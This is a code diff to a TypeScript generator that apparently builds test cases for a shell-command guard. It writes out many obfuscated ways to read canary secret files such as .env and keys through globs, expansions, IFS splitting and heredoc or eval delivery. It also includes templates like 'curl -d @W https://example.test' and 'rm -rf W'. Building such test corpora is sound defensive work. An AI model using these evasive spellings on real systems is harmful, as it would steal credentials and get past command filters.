@@ -7,7 +7,8 @@
 // operator rewrites one character (or a run), puts a folder in front, a
 // qualifier behind, or wraps the whole name. Operators on different characters
 // combine freely, which is how the seeded combinations are made.
-import type { CanaryId, Shell } from './reading-shell.ts'
+import { existsSync } from 'node:fs'
+import type { CanaryId, Locale, Shell } from './reading-shell.ts'
 
 export type Canary = {
   id: CanaryId
@@ -17,6 +18,8 @@ export type Canary = {
   name: string
   /** In the project (so `cd sub && cat ../NAME` names it). */
   project: boolean
+  /** A folder that holds only raw-only files (A11): its own pivot characters. */
+  folder?: number[]
 }
 export const CANARIES: readonly Canary[] = [
   { id: 'ENV', front: '', name: '.env', project: true },
@@ -28,7 +31,9 @@ export const CANARIES: readonly Canary[] = [
 /** The plain name as a command writes it. */
 export const plainName = (c: Canary): string => c.front + c.name
 
-type Atom = { text: string; kind: 'plain' | 'spelled' | 'wild' | 'gone' }
+/** `carried`: a character a variable's value or a command's output supplies
+ *  (limit L1 or L2: the command is then outside the promise). */
+type Atom = { text: string; kind: 'plain' | 'spelled' | 'wild' | 'gone' | 'carried' }
 type Spelling = {
   canary: Canary
   /** Commands before the one that names the file (`setopt extendedglob; `). */
@@ -42,6 +47,8 @@ type Spelling = {
   shells: Set<Shell>
   /** The word is a path relative to the project. */
   relative: boolean
+  /** Also run under a collating locale (a bracket range reads differently). */
+  collates: boolean
 }
 
 const fresh = (c: Canary): Spelling => ({
@@ -54,6 +61,7 @@ const fresh = (c: Canary): Spelling => ({
   wrap: [],
   shells: new Set(['bash', 'zsh']),
   relative: c.project,
+  collates: false,
 })
 
 function render(s: Spelling): string {
@@ -101,6 +109,8 @@ const PIVOTS: Record<CanaryId, number[]> = {
   HOME: [3, 9],
 }
 
+const pivots = (c: Canary): number[] => c.folder ?? PIVOTS[c.id]
+
 /** An edit of one character, where `fits` allows it. */
 function perChar(
   fits: (c: Canary, i: number) => boolean,
@@ -110,7 +120,7 @@ function perChar(
 ): Operator['edits'] {
   return (c, everywhere) => {
     const out: Edit[] = []
-    const at = everywhere ? [...c.name].map((_, i) => i) : PIVOTS[c.id]
+    const at = everywhere ? [...c.name].map((_, i) => i) : pivots(c)
     for (const i of at) {
       if (!fits(c, i)) continue
       for (const text of make(c.name[i]!, c, i))
@@ -199,7 +209,7 @@ const innerStar: Operator['edits'] = (c, everywhere) => {
   if (c.id === 'KEY') return []
   const out: Edit[] = []
   const end = c.id === 'PEM' ? c.name.indexOf('.') : c.name.length
-  const at = everywhere ? [...c.name].map((_, i) => i) : PIVOTS[c.id]
+  const at = everywhere ? [...c.name].map((_, i) => i) : pivots(c)
   for (const i of at)
     for (const len of [1, 2]) {
       if (i + len > end) continue
@@ -286,6 +296,34 @@ const substituted = (pre: string, forms: ((text: string) => string)[], ...shells
           })),
     ]
 }
+
+/** zsh glob qualifiers that filter or sort and match a plain file of the
+ *  user's (zshexpn, "Glob Qualifiers"). */
+const QUALIFIERS = [
+  ...'.rwAIRUGNDn',
+  '-.',
+  '^/',
+  '^@',
+  '^*',
+  'om',
+  'On',
+  'oL',
+  'Oa',
+  '[1]',
+  '[1,2]',
+  'L+0',
+  'm-1',
+  'a-1',
+  'c-1',
+  'Y1',
+  'l1',
+  'f600',
+  'f:u+r:',
+  '#q.',
+  ':a',
+  ':A',
+  ':P',
+]
 
 export const OPERATORS: readonly Operator[] = [
   { id: 'O1', edits: perChar(any, (ch) => [`${ch}''`, `${ch}""`], 'spelled') },
@@ -519,6 +557,193 @@ export const OPERATORS: readonly Operator[] = [
       bareStar
     ),
   },
+  // ── addendum 2 (contract §7.8) ──
+  {
+    // Old arithmetic, alone and inside a written default (A1).
+    id: 'O31',
+    edits: digitRun((d) => [`$[${d}]`, `$[ ${d} + 0 ]`, `\${x:-$[${d}]}`, `"$[${d}]"`], 'spelled'),
+  },
+  {
+    // Arithmetic inside a written default.
+    id: 'O32',
+    edits: digitRun(
+      (d) => [
+        `\${x:-$((${d}))}`,
+        `\${x-$((${d}))}`,
+        `\${x:=$((${d}))}`,
+        `\${HOME:+$((${d}))}`,
+        `"\${x:-$((${d}))}"`,
+      ],
+      'spelled'
+    ),
+  },
+  {
+    // Each operator of A1 whose operand the shell puts into the word, with a
+    // number as the operand (a spelled name there is O21, O27 and O30; a
+    // command there is the positions OPERANDS).
+    id: 'O33',
+    edits: both(
+      digitRun(
+        (d) =>
+          [`$((${d}))`, `$[${d}]`].flatMap((n) => [
+            `\${x=${n}}`,
+            `\${HOME+${n}}`,
+            `\${x:-\${y:-${n}}}`,
+          ]),
+        'spelled'
+      ),
+      (c) =>
+        digitRun(
+          (d) =>
+            [`$((${d}))`, `$[${d}]`].flatMap((n) => [
+              `\${Y/a/${n}}`,
+              `\${Y//a/${n}}`,
+              `\${Y/#a/${n}}`,
+              `\${Y/%a/${n}}`,
+            ]),
+          'spelled'
+        )(c).map((e): Edit => (s) => {
+          if (s.pre !== '' || !e(s)) return false
+          s.pre = 'Y=a; '
+          return true
+        }),
+      (c) =>
+        digitRun((d) => [`$((${d}))`, `$[${d}]`].map((n) => `\${x::=${n}}`), 'spelled', 'zsh')(c)
+    ),
+  },
+  {
+    // zsh: something before the name that is not `#` or `!`, with written text.
+    id: 'O34',
+    edits: (c) =>
+      wrapped(
+        [
+          (b) => `\${~x:-${b}}`,
+          (b) => `\${=x:-${b}}`,
+          (b) => `\${==x:-${b}}`,
+          (b) => `\${^x:-${b}}`,
+          (b) => `\${^^x:-${b}}`,
+          (b) => `\${+x:-${b}}`,
+          (b) => `\${~~x:-${b}}`,
+          (b) => `\${=~x:-${b}}`,
+          (b) => `\${~:-${b}}`,
+          (b) => `\${"\${:-${b}}"}`,
+          (b) => `\${"$Z":-${b}}`,
+        ],
+        'zsh'
+      )().map(
+        (e): Edit =>
+          (s) =>
+            c.front === '' && e(s)
+      ),
+  },
+  {
+    // Bracket expressions by the POSIX grammar (A2). `[[.x.]]` and `[[=x=]]`
+    // are bash's; a range whose ends differ in case reads by the locale.
+    id: 'O35',
+    edits: both(
+      perChar(
+        globbable,
+        (ch) => [`[\\]${ch}]`, `[]${ch}]`, `[${ch}\\]]`, `[!\\]]`, `[!]]`],
+        'wild',
+        (s) => void (s.collates = true)
+      ),
+      perChar(
+        globbable,
+        (ch) => [`[[.${ch}.]]`, `[[=${ch}=]]`],
+        'wild',
+        (s) => {
+          s.collates = true
+          only('bash')(s)
+        }
+      ),
+      perChar(
+        (c, i) => /[b-y]/.test(c.name[i]!),
+        (ch) => {
+          const lo = String.fromCharCode(ch.charCodeAt(0) - 1)
+          const hi = String.fromCharCode(ch.charCodeAt(0) + 1)
+          // `[M-o]` holds `n` by its code; `[m-O]` only where a locale collates.
+          return [`[${lo.toUpperCase()}-${hi}]`, `[${lo}-${hi.toUpperCase()}]`]
+        },
+        'wild',
+        (s) => void (s.collates = true)
+      )
+    ),
+  },
+  {
+    // zsh: groups inside groups, with alternatives.
+    id: 'O36',
+    edits: both(
+      perChar(
+        globbable,
+        (ch) => [`((${ch}))`, `(((${ch})))`, `((${ch}|x)|x)`, `(((${ch}|x))|x)`],
+        'wild',
+        only('zsh')
+      ),
+      wholeName(
+        (c) =>
+          c.name.includes('/')
+            ? []
+            : [
+                `((${c.name.slice(0, 2)})${c.name.slice(2)})`,
+                `(${c.name.slice(0, 1)}(${c.name.slice(1, 2)})${c.name.slice(2)})`,
+                `(${c.name.slice(0, 2)}(${c.name.slice(2)}))`,
+                `(${c.name.slice(0, 2)}(${c.name.slice(2, 3)}|x)${c.name.slice(3)}|x)`,
+                `(((${c.name.slice(0, 1)})${c.name.slice(1, 2)})${c.name.slice(2)})`,
+              ],
+        'zsh'
+      )
+    ),
+  },
+  {
+    // zsh: glob qualifiers. Those that only filter or sort (each letter of
+    // the manual that takes no argument, and a few that take one) stand
+    // behind a word with a `?`; `e`, `P` and a `:s` modifier write the name.
+    id: 'O37',
+    edits: both(
+      (c, everywhere) =>
+        perChar(
+          globbable,
+          () => ['?'],
+          'wild'
+        )(c, everywhere).flatMap((e) =>
+          QUALIFIERS.map((tail): Edit => (s) => {
+            if (s.tail !== '' || s.wrap.length > 0 || !e(s)) return false
+            s.tail = `(${tail})`
+            only('zsh')(s)
+            return true
+          })
+        ),
+      (c) =>
+        !c.project
+          ? []
+          : wholeName(
+              (c) => [
+                `sub(e:'REPLY=${c.name}':)`,
+                `sub(P:${c.name}:)`,
+                ...(c.name.includes('/') ? [] : [`sub(:s/sub/${c.name}/)`]),
+              ],
+              'zsh'
+            )(c)
+    ),
+  },
+  {
+    // Limit L1, to show where it starts: one character of the name is a
+    // variable's value. Outside the promise; counted, never a miss.
+    id: 'O40',
+    edits: (c, everywhere) =>
+      perChar(
+        (c, i) => isAlnum(c.name[i]!),
+        () => ['${C}'],
+        'carried'
+      )(c, everywhere).map((e, k) => (s: Spelling) => {
+        if (s.pre !== '' || !e(s)) return false
+        const at = (everywhere ? [...c.name].map((_, i) => i) : pivots(c)).filter((i) =>
+          isAlnum(c.name[i]!)
+        )[k]!
+        s.pre = `C=${c.name[at]}; `
+        return true
+      }),
+  },
 ]
 
 // ── positions ──
@@ -542,6 +767,8 @@ export type Position = {
   /** One of many positions of a kind: tried with a sample of the spellings
    *  (a brace list and a bracket list of the ENV canary), not with all. */
   sample?: true
+  /** bash from 4.0 only. */
+  bash4?: true
 }
 
 const run = (id: string, make: Position['make'], more: Partial<Position> = {}): Position => ({
@@ -572,7 +799,9 @@ export const POSITIONS: readonly Position[] = [
   run('P17', (w) => `cat =(cat ${w})`, { shell: 'zsh' }),
   run('P18', (w) => `echo \${x:-$(cat ${w})}`),
   run('P19', (w) => `echo "\${x:-$(cat ${w})}"`),
-  run('P20', (w) => `: $(( $(cat ${w}) ))`),
+  // zsh reports the error without the text: its own row below.
+  run('P20', (w) => `: $(( $(cat ${w}) ))`, { shell: 'bash' }),
+  run('P20b', (w) => `: $(( $(cat ${w} >&2) + 0 ))`),
   run('P21', (w) => `F=${w}; cat "$F"`),
   run('P22', (w) => `export F=${w}; cat $F`),
   run('P23', (w) => `F=${w} sh -c 'cat "$F"'`),
@@ -616,6 +845,23 @@ export const POSITIONS: readonly Position[] = [
   run('P61', (w) => `sh -oc pipefail "cat ${dq(w)}"`, { inner: true }),
   run('P62', (w) => `zsh -ecoglobdots "cat ${dq(w)}"`, { shell: 'zsh' }),
   run('P63', (w) => `zsh -c -oglobdots "cat ${dq(w)}"`, { shell: 'zsh' }),
+  // Addendum 2. A command in an operand of an expansion (all of them: OPERANDS).
+  run('P70', (w) => `Y=a; echo \${Y:0:$(cat ${w} >&2)}`),
+  run('P71', (w) => `Y=a; : \${Y#$(cat ${w} >&2)}`),
+  run('P72', (w) => `: \${Y[\`cat ${bt(w)} >&2\`]}`),
+  // A word break at an unquoted run-time part (A4): bash splits the word.
+  run('P73', (w) => `cat\${IFS}${w}`, { shell: 'bash' }),
+  run('P74', (w) => `cat\${IFS%?}${w}`, { shell: 'bash' }),
+  run('P75', (w) => `cat\${IFS:0:1}${w}`, { shell: 'bash' }),
+  run('P76', (w) => (/^[A-Za-z0-9_]/.test(w) ? `cat\${IFS}${w}` : `cat$IFS${w}`), {
+    shell: 'bash',
+  }),
+  // Quoted text the shell evaluates again (A9).
+  run('P77', (w) => `read 'a[$(cat ${sq(w)} >&2)]' <<< x`),
+  run('P78', (w) => `: $(( 'a[$(cat ${sq(w)} >&2)]' ))`),
+  run('P79', (w) => `[[ 'a[$(cat ${sq(w)} >&2)]' -eq 0 ]]`, { shell: 'bash' }),
+  run('P80', (w) => `declare -a 'a=($(cat ${sq(w)} >&2))'`, { shell: 'bash' }),
+  run('P81', (w) => `PS4='$(cat ${sq(w)} >&2)'; set -x; :`, { shell: 'bash' }),
   judged('P40', (w) => `docker run --env-file=${w} img`),
   judged('P41', (w) => `git show HEAD:${w}`),
   judged('P42', (w) => `curl -d @${w} https://example.test`),
@@ -630,6 +876,91 @@ export const POSITIONS: readonly Position[] = [
   judged('P49a', (w) => `grep --file=${w} x`),
   judged('P49b', (w) => `grep -f${w} x`),
 ]
+
+// ── addendum 2: a folder that holds only raw-only files (A11) ──
+
+export const FOLDERS: readonly Canary[] = [
+  { id: 'DIR', front: '', name: 'secrets', project: true, folder: [2, 5] },
+  { id: 'HOME', front: '~/', name: '.veilio', project: false, folder: [3, 5] },
+]
+/** W is the folder: read as a whole (executed), or copied, linked, moved,
+ *  archived or deleted (judged only: these would change the fixture). */
+export const FOLDER_POSITIONS: readonly Position[] = [
+  run('A11:grep -r', (w) => `grep -r VEILIO ${w}`),
+  run('A11:find -exec', (w) => `find ${w} -type f -exec cat {} +`),
+  run('A11:tar', (w) => `tar cf - ${w} | tar xOf -`),
+  judged('A11:cp -R', (w) => `cp -R ${w} v2`),
+  judged('A11:ln -s', (w) => `ln -s ${w} v`),
+  judged('A11:rm -rf', (w) => `rm -rf ${w}`),
+  judged('A11:mv', (w) => `mv ${w} x`),
+  judged('A11:tar czf', (w) => `tar czf s.tgz ${w}`),
+  judged('A11:git -C', (w) => `git -C ${w} init`),
+  judged('A11:rsync', (w) => `rsync -a src/ ${w}/`),
+  judged('A11:find -delete', (w) => `find ${w} -delete`),
+  judged('A11:ls', (w) => `ls ${w}`),
+]
+
+// ── addendum 2: a command inside each operand of an expansion (A1, O33) ──
+
+/** Each expansion operator of A1 and each of its operands, as text with the
+ *  operand's place marked: `Y` is set to `a`, `x` is unset. `shells`: where
+ *  the operand is evaluated (measured in bash 3.2 and zsh 5.9); `bash4`:
+ *  bash from 4.0 only. */
+const EXPANSIONS: readonly {
+  id: string
+  make: (operand: string) => string
+  shells?: Shell[]
+  bash4?: true
+}[] = [
+  { id: ':-', make: (o) => `\${x:-${o}}` },
+  { id: '-', make: (o) => `\${x-${o}}` },
+  { id: ':=', make: (o) => `\${x:=${o}}` },
+  { id: '=', make: (o) => `\${x=${o}}` },
+  { id: ':+', make: (o) => `\${HOME:+${o}}` },
+  { id: '+', make: (o) => `\${HOME+${o}}` },
+  { id: ':?', make: (o) => `\${x:?${o}}`, shells: ['bash'] },
+  { id: '?', make: (o) => `\${x?${o}}`, shells: ['bash'] },
+  { id: '#', make: (o) => `\${Y#${o}}` },
+  { id: '##', make: (o) => `\${Y##${o}}` },
+  { id: '%', make: (o) => `\${Y%${o}}` },
+  { id: '%%', make: (o) => `\${Y%%${o}}` },
+  { id: '/pattern', make: (o) => `\${Y/${o}/z}` },
+  { id: '//pattern', make: (o) => `\${Y//${o}/z}` },
+  { id: '/#pattern', make: (o) => `\${Y/#${o}/z}` },
+  { id: '/%pattern', make: (o) => `\${Y/%${o}/z}` },
+  { id: '/text', make: (o) => `\${Y/a/${o}}` },
+  { id: '//text', make: (o) => `\${Y//a/${o}}` },
+  { id: ':offset', make: (o) => `\${Y:${o}}` },
+  { id: ':length', make: (o) => `\${Y:0:${o}}` },
+  { id: '[subscript]', make: (o) => `\${Y[${o}]}` },
+  { id: '#[subscript]', make: (o) => `\${#Y[${o}]}` },
+  { id: '![subscript]', make: (o) => `\${!x[${o}]}`, shells: ['bash'] },
+  { id: '^', make: (o) => `\${Y^${o}}`, shells: ['bash'], bash4: true },
+  { id: ',', make: (o) => `\${Y,${o}}`, shells: ['bash'], bash4: true },
+  { id: '::=', make: (o) => `\${Y::=${o}}` },
+  { id: ':/pattern', make: (o) => `\${Y:/${o}/z}` },
+  { id: ':/text', make: (o) => `\${Y:/a/${o}}` },
+]
+const PAYLOADS: readonly { id: string; make: (w: string) => string }[] = [
+  { id: '$()', make: (w) => `$(cat ${w} >&2)` },
+  { id: '``', make: (w) => `\`cat ${bt(w)} >&2\`` },
+  { id: '$[$()]', make: (w) => `$[ $(cat ${w} >&2) ]` },
+]
+/** bash's major version, told by the oracle before it generates (3 until then). */
+let bashMajor = 3
+export const bashIs = (major: number): void => void (bashMajor = major)
+
+/** Every operand of every expansion holding a command that names W: tried
+ *  with a sample of the spellings, as the option clusters are. */
+export const OPERANDS: readonly Position[] = EXPANSIONS.flatMap((x) =>
+  PAYLOADS.map((p) =>
+    run(`P:\${${x.id}}${p.id}`, (w) => `Y=a; : ${x.make(p.make(w))}`, {
+      sample: true,
+      ...(x.shells ? { shell: x.shells[0]! } : {}),
+      ...(x.bash4 ? { bash4: true as const } : {}),
+    })
+  )
+)
 
 // A shell's option clusters: each single-letter option the shell accepts
 // beside `-c` (measured in bash 3.2 and zsh 5.9: the script runs; left out
@@ -710,7 +1041,7 @@ export const CLUSTERS: readonly Position[] = [
 // ── the closed vocabulary (§6) ──
 
 const VOCABULARY = new Set(
-  'cat head tail dd grep sed awk printf echo read : true test [ [[ cd pwd export declare typeset local eval exec source . for while until if case setopt unsetopt shopt set alias bash sh zsh xargs env command nice mapfile'.split(
+  'find tar cat head tail dd grep sed awk printf echo read : true test [ [[ cd pwd export declare typeset local eval exec source . for while until if case setopt unsetopt shopt set alias bash sh zsh xargs env command nice mapfile'.split(
     ' '
   )
 )
@@ -723,12 +1054,14 @@ const FILLERS = new Set(
 for (const p of CLUSTERS)
   for (const m of p.make('W').matchAll(/[A-Za-z_][A-Za-z0-9_]*/g)) FILLERS.add(m[0])
 FILLERS.add('rcfile').add('emulate')
+for (const w of 'Y z HOME IFS a q PS4 Z eq C VEILIO type cf xOf'.split(' ')) FILLERS.add(w)
 const MARK = 'W'
 
 /** Throws unless an executed command is made of the closed vocabulary and its
  *  word W can run nothing but `pwd`, write nothing and end no command. */
 export function assertVocabulary(pre: string, position: Position, word: string): void {
-  const skeleton = pre + position.make(MARK)
+  // O40 sets `C` to one character of the name.
+  const skeleton = pre.replace(/^C=[A-Za-z0-9]; /, 'C=x; ') + position.make(MARK)
   for (const m of skeleton.matchAll(/[A-Za-z_][A-Za-z0-9_]*/g))
     if (!VOCABULARY.has(m[0]) && !FILLERS.has(m[0]))
       throw new Error(
@@ -761,6 +1094,14 @@ export type Generated = {
   proofShells: Shell[]
   /** The shells that run it; none for a position that is only judged. */
   shells: Shell[]
+  /** The locales it is run under (C; a bracket range also where one collates). */
+  locales: Locale[]
+  /** The grammar values it shows alive (rule R5): an operator applied alone,
+   *  the position, each axis value of a delivery, a trigger's kind. */
+  values: string[]
+  /** A variable's value or a command's output supplies a character of the
+   *  canary's path: outside the promise (limits L1 and L2). */
+  carried: boolean
 }
 
 /** `@PROJ@` in a word is the project's real path, known when the fixture is. */
@@ -782,10 +1123,14 @@ function command(
   const shells = !p.executed
     ? []
     : [...s.shells].filter(
-        (sh) => (!p.shell || p.shell === sh) && (!p.inner || s.shells.has('bash'))
+        (sh) =>
+          (!p.shell || p.shell === sh) &&
+          (!p.inner || s.shells.has('bash')) &&
+          !(p.bash4 && bashMajor < 4)
       )
   // The proof is run too, so the word is checked for every position.
-  assertVocabulary(s.pre, p.executed ? p : POSITIONS[0]!, word)
+  const first = s.canary.folder ? FOLDER_POSITIONS[0]! : POSITIONS[0]!
+  assertVocabulary(s.pre, p.executed ? p : first, word)
   return {
     id,
     operatorIds,
@@ -793,9 +1138,12 @@ function command(
     canary: s.canary.id,
     command: s.pre + p.make(word),
     plain: p.make(at(plainName(s.canary), proj)),
-    proof: s.pre + POSITIONS[0]!.make(word),
+    proof: s.pre + first.make(word),
     proofShells: [...s.shells],
     shells,
+    locales: s.collates ? ['C', 'en_US.UTF-8'] : ['C'],
+    values: [...(operatorIds.length === 1 ? [operatorIds[0]!] : []), p.id],
+    carried: s.atoms.some((a) => a.kind === 'carried'),
   }
 }
 
@@ -813,11 +1161,34 @@ export function fullProduct(proj: string): Generated[] {
         }
         // The many option clusters: with a brace list and a bracket list.
         if (c.id === 'ENV' && k === 0 && (o.id === 'O10' || o.id === 'O12'))
-          for (const p of CLUSTERS) {
+          for (const p of [...CLUSTERS, ...OPERANDS]) {
             const g = command(`F:${c.id}:${o.id}.${k}:${p.id}`, [o.id], s, p, proj)
             if (g) out.push(g)
           }
       })
+  return out
+}
+
+/** The whole folders of A11 (canary DIR is in `secrets`, HOME in `~/.veilio`),
+ *  by every operator at their pivot characters, in the folder positions. */
+export function folders(proj: string): Generated[] {
+  const out: Generated[] = []
+  for (const c of FOLDERS)
+    for (const o of OPERATORS)
+      o.edits(c, false).forEach((edit, k) => {
+        const s = fresh(c)
+        if (!edit(s) || !partsKeepText(s)) return
+        for (const p of FOLDER_POSITIONS) {
+          const g = command(`A11:${c.name}:${o.id}.${k}:${p.id}`, [o.id], s, p, proj)
+          if (g) out.push({ ...g, values: [p.id] })
+        }
+      })
+  // The folder by its plain name.
+  for (const c of FOLDERS)
+    for (const p of FOLDER_POSITIONS) {
+      const g = command(`A11:${c.name}:plain:${p.id}`, [], fresh(c), p, proj)
+      if (g) out.push(g)
+    }
   return out
 }
 
@@ -855,5 +1226,446 @@ export function combinations(n: number, seed: number, proj: string): Generated[]
     out.push(g)
     index++
   }
+  return out
+}
+
+// ── addendum 2: how a script reaches a shell (contract §7.8, G2) ──
+//
+// A delivery is one value from each of six axes: a wrapper, the word that is
+// the shell, its options, the form the script is written in, the channel it
+// arrives by, and the command it holds - which may be a delivery again.
+
+/** What runs the script: a shell by its kind, any program that is one
+ *  (`$SHELL`), or the shell the command itself runs in (`eval`). */
+type Kind = 'sh' | 'bash' | 'zsh' | 'csh' | 'any' | 'eval' | 'source'
+type Value = { id: string; outer?: Shell[] }
+type ShellWord = Value & { word: string; kind: Kind }
+const onMac = process.platform === 'darwin'
+const SHELL_WORDS: readonly ShellWord[] = [
+  { id: 'sh', word: 'sh', kind: 'sh' },
+  { id: 'bash', word: 'bash', kind: 'bash' },
+  { id: 'zsh', word: 'zsh', kind: 'zsh' },
+  { id: '/bin/sh', word: '/bin/sh', kind: 'sh' },
+  { id: '/bin/bash', word: '/bin/bash', kind: 'bash' },
+  // A file system that folds case runs these (macOS).
+  ...(onMac
+    ? ([
+        { id: 'SH', word: 'SH', kind: 'sh' },
+        { id: '/BIN/SH', word: '/BIN/SH', kind: 'sh' },
+        { id: '/bin/Bash', word: '/bin/Bash', kind: 'bash' },
+      ] as const)
+    : []),
+  // bash sets SHELL and BASH itself; zsh sets neither.
+  { id: '$SHELL', word: '$SHELL', kind: 'any', outer: ['bash'] },
+  { id: '"$BASH"', word: '"$BASH"', kind: 'bash', outer: ['bash'] },
+  { id: '$0', word: '$0', kind: 'any' },
+  { id: '"${SHELL:-bash}"', word: '"${SHELL:-bash}"', kind: 'any' },
+  { id: '/bin/b?sh', word: '/bin/b?sh', kind: 'bash' },
+  { id: './mysh', word: './mysh', kind: 'sh' },
+  ...(existsSync('/bin/csh') ? ([{ id: 'csh', word: 'csh', kind: 'csh' }] as const) : []),
+  ...(existsSync('/bin/tcsh') ? ([{ id: 'tcsh', word: 'tcsh', kind: 'csh' }] as const) : []),
+  { id: 'eval', word: 'eval', kind: 'eval' },
+  { id: 'source /dev/stdin', word: 'source /dev/stdin', kind: 'source' },
+]
+
+type Wrapper = Value & { wrap: (command: string) => string; kinds?: Kind[]; argument?: true }
+const SHELLS_ONLY: Kind[] = ['sh', 'bash', 'zsh', 'csh', 'any']
+const WRAPPERS: readonly Wrapper[] = [
+  { id: 'none', wrap: (c) => c },
+  { id: 'env X=1', wrap: (c) => `env X=1 ${c}`, kinds: SHELLS_ONLY },
+  { id: 'env -u sh', wrap: (c) => `env -u sh ${c}`, kinds: SHELLS_ONLY },
+  { id: 'env -i PATH=$PATH', wrap: (c) => `env -i PATH=$PATH ${c}`, kinds: SHELLS_ONLY },
+  { id: 'exec', wrap: (c) => `exec ${c}`, kinds: SHELLS_ONLY },
+  { id: 'exec -a sh', wrap: (c) => `exec -a sh ${c}`, kinds: SHELLS_ONLY },
+  { id: 'command', wrap: (c) => `command ${c}`, kinds: SHELLS_ONLY },
+  { id: 'command (eval)', wrap: (c) => `command ${c}`, kinds: ['eval'], outer: ['bash'] },
+  { id: 'builtin', wrap: (c) => `builtin ${c}`, kinds: ['eval', 'source'] },
+  { id: 'nice', wrap: (c) => `nice ${c}`, kinds: SHELLS_ONLY },
+  { id: 'nohup', wrap: (c) => `nohup ${c}`, kinds: SHELLS_ONLY },
+  ...(existsSync('/usr/bin/timeout')
+    ? [{ id: 'timeout 5', wrap: (c: string) => `timeout 5 ${c}`, kinds: SHELLS_ONLY }]
+    : []),
+  { id: 'time', wrap: (c) => `time ${c}` },
+  // The script is an argument of the wrapped command: xargs gives it no input.
+  {
+    id: 'xargs -I{}',
+    wrap: (c) => `echo x | xargs -I{} ${c}`,
+    kinds: SHELLS_ONLY,
+    argument: true,
+  },
+  {
+    id: 'xargs -I sh',
+    wrap: (c) => `echo x | xargs -I sh ${c}`,
+    kinds: ['bash', 'zsh', 'csh', 'any'],
+    argument: true,
+  },
+  { id: 'noglob', wrap: (c) => `noglob ${c}`, outer: ['zsh'] },
+  { id: 'nocorrect', wrap: (c) => `nocorrect ${c}`, outer: ['zsh'] },
+  { id: 'exec (eval)', wrap: (c) => `exec ${c}`, kinds: ['eval'], outer: ['zsh'] },
+  // zsh's `-`: the program is started as a login shell is.
+  { id: '-', wrap: (c) => `- ${c}`, kinds: ['bash', 'zsh'], outer: ['zsh'] },
+]
+
+/** `scripted`: the options end in `c`, the script is the next word. */
+type Options = Value & { text: string; kinds: Kind[]; scripted: boolean }
+const SH3: Kind[] = ['sh', 'bash', 'zsh']
+const OPTIONS: readonly Options[] = [
+  { id: '-c', text: '-c', kinds: [...SH3, 'csh', 'any'], scripted: true },
+  { id: '-ec', text: '-ec', kinds: [...SH3, 'any'], scripted: true },
+  { id: '-e -c', text: '-e -c', kinds: SH3, scripted: true },
+  { id: '-uxc', text: '-uxc', kinds: SH3, scripted: true },
+  { id: '-o pipefail -c', text: '-o pipefail -c', kinds: SH3, scripted: true },
+  { id: '-fc (csh)', text: '-fc', kinds: ['csh'], scripted: true },
+  // The allow-list entries of research D22.
+  { id: '--norc -c', text: '--norc -c', kinds: ['bash'], scripted: true },
+  { id: '--noprofile --norc -c', text: '--noprofile --norc -c', kinds: ['bash'], scripted: true },
+  { id: '--login -c', text: '--login -c', kinds: ['bash'], scripted: true },
+  { id: '-fc', text: '-fc', kinds: ['zsh'], scripted: true },
+  { id: '-f -c', text: '-f -c', kinds: ['zsh'], scripted: true },
+  { id: '-df -c', text: '-df -c', kinds: ['zsh'], scripted: true },
+  { id: '(none)', text: '', kinds: [...SH3, 'csh', 'any', 'eval', 'source'], scripted: false },
+  { id: '-e', text: '-e', kinds: SH3, scripted: false },
+  { id: '--norc', text: '--norc', kinds: ['bash'], scripted: false },
+  { id: '-f', text: '-f', kinds: ['zsh', 'csh'], scripted: false },
+]
+
+/** The script as one word of the command; null when the form cannot hold it. */
+type Form = Value & { write: (script: string) => string | null }
+const ansi = (t: string) => t.replace(/[\\']/g, '\\$&').replace(/\n/g, '\\n')
+/** One letter of the text as `\xNN` (the first after a blank or a dot). */
+const oneHex = (t: string) => t.replace(/(?<=[ .])[a-z]/, (ch) => `\\x${hex(ch)}`)
+const FORMS: readonly Form[] = [
+  { id: `'…'`, write: (t) => `'${sq(t)}'` },
+  { id: `"…"`, write: (t) => `"${dq(t)}"` },
+  { id: `$'…'`, write: (t) => `$'${ansi(t)}'` },
+  { id: `$'…\\xNN…'`, write: (t) => `$'${oneHex(ansi(t))}'` },
+  {
+    id: 'backslash-blank',
+    write: (t) => (t.includes('\n') ? null : t.replace(/[^A-Za-z0-9_./[\]-]/g, '\\$&')),
+  },
+  { id: `"…$x"`, write: (t) => `"${dq(t)}$x"` },
+  {
+    id: `'…'""'…'`,
+    write: (t) => {
+      const at = Math.ceil(t.length / 2)
+      return `'${sq(t.slice(0, at))}'""'${sq(t.slice(at))}'`
+    },
+  },
+]
+
+type Channel = Value & {
+  /** The script is the word after the options (they must end in `c`). */
+  argument?: true
+  /** The script is written by the channel itself, not as a word in a form. */
+  body?: true
+  kinds: Kind[]
+  build: (x: { shell: string; word: string; script: string; wrap: (c: string) => string }) => string
+}
+/** A here-document's body under a plain delimiter, where `$`, a backtick and
+ *  a backslash are still read. */
+const plainBody = (t: string) => t.replace(/[\\$`]/g, '\\$&')
+const INPUT: Kind[] = [...SH3, 'any', 'source']
+const STDIN: Kind[] = [...SH3, 'any']
+const CHANNELS: readonly Channel[] = [
+  {
+    id: 'the word after -c',
+    argument: true,
+    kinds: [...SH3, 'csh', 'any', 'eval'],
+    build: (x) => x.wrap(`${x.shell} ${x.word}`),
+  },
+  { id: '<<<', kinds: INPUT, build: (x) => `${x.wrap(x.shell)} <<< ${x.word}` },
+  {
+    id: '<<E',
+    body: true,
+    kinds: INPUT,
+    build: (x) => `${x.wrap(x.shell)} <<E\n${plainBody(x.script)}\nE`,
+  },
+  {
+    id: `<<'E'`,
+    body: true,
+    kinds: INPUT,
+    build: (x) => `${x.wrap(x.shell)} <<'E'\n${x.script}\nE`,
+  },
+  {
+    id: '<<-E',
+    body: true,
+    kinds: INPUT,
+    build: (x) => `${x.wrap(x.shell)} <<-E\n\t${plainBody(x.script)}\n\tE`,
+  },
+  { id: 'two <<<', kinds: STDIN, build: (x) => `${x.wrap(x.shell)} <<< 'true' <<< ${x.word}` },
+  {
+    id: 'two <<',
+    body: true,
+    kinds: STDIN,
+    build: (x) => `${x.wrap(x.shell)} <<'E' <<'F'\ntrue\nE\n${x.script}\nF`,
+  },
+  { id: '{ } <<<', kinds: STDIN, build: (x) => `{ ${x.wrap(x.shell)}; } <<< ${x.word}` },
+  { id: '( ) <<<', kinds: STDIN, build: (x) => `( ${x.wrap(x.shell)} ) <<< ${x.word}` },
+  {
+    id: 'if <<<',
+    kinds: STDIN,
+    build: (x) => `if true; then ${x.wrap(x.shell)}; fi <<< ${x.word}`,
+  },
+  {
+    id: 'while <<<',
+    kinds: STDIN,
+    build: (x) => `while ${x.wrap(x.shell)}; do break; done <<< ${x.word}`,
+  },
+  {
